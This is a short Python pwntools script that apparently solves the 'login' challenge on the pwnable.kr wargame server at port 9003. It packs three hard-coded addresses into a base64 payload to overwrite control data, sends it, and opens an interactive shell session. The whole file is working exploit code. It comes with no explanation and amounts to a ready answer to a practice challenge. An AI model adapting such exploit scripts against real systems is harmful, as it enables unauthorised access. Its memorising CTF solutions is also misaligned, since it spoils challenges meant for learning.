from pwn import *
import base64
#p = process("./login")
p = remote("pwnable.kr", 9003)
pause()
if __name__ == "__main__":
	payload = base64.b64encode(p32(0xdeadbeef) +p32(0x0804925f) + p32(0x0811eb40))
	print(payload)
	p.sendline(payload)
	p.interactive()


